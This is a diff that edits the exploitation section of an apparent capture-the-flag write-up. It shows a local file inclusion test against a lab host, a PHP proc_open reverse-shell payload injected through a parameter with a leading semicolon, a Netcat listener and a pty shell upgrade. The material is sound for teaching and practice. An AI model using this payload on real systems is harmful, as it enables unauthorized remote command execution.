@@ -97,10 +97,14 @@ The output confirmed that the files inside the web root were owned by the `root`
 
 ---
 ## Exploitation
-It gave us a hint where is the path that mean we can attempts  local file inclusion
 
-```
-death@esther:~$ curl http://10.49.172.109/index.php?path=/
+The comment inside `index.php` hinted toward a hidden path parameter, so I started testing for Local File Inclusion behavior.
+
+I added a `path` parameter to the request and pointed it to the root directory.
+
+```bash id="d8jv9s"
+$ curl http://10.49.172.109/index.php?path=/
+
 <html>
 <body>
 	<pre>
@@ -133,34 +137,37 @@ drwxr-xr-x  14 root   root    4.0K Jul 15  2021 var
 
 </body>
 </html>
-
-death@esther:~$ 
 ```
-Cool we hit a jackpot
 
-Let create a reverse shell
+At this point, the vulnerability was confirmed. The application was taking user supplied input from the `path` parameter and exposing filesystem contents directly.
 
-After few attempts i got the shell with this php `proc_open`
-```
+After a few payload attempts, I managed to get command execution using a PHP `proc_open` reverse shell.
+
+```bash id="m1rj7u"
 ;php -r '$s=fsockopen("<IP>",<Port>);proc_open("sh",[$s,$s,$s],$p);'
 ```
 
-set up listener and get a reverse shell:
+Before sending the payload, I started a Netcat listener on my machine.
+
+```bash id="s9zv2p"
+$ nc -lvnp 1234
 ```
-nc -lvnp 1234
-```
-Let inject this rev shell 
+
+I injected the payload through the vulnerable parameter.
 
 <img width="1318" height="151" alt="image" src="https://github.com/user-attachments/assets/e21a1e77-120d-43b9-917c-5eaa65e0b459" />
 
-We got the shell
+A few seconds later, the reverse shell connected back successfully.
 
 <img width="486" height="90" alt="image" src="https://github.com/user-attachments/assets/905de5d4-51e5-4dd4-8a18-04f1ce0feffe" />
 
-And spawn a more stable shell to make interacting with it easier.
+Once inside the machine, I upgraded the shell to make interaction more stable.
+
+```bash id="u4qn8x"
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
+
+Now I had a proper interactive shell and could continue enumerating the system further.
 
 ## Escalation
 Now that we have access to an account, let’s attempt to escalate our privileges from the “mike” account to root.
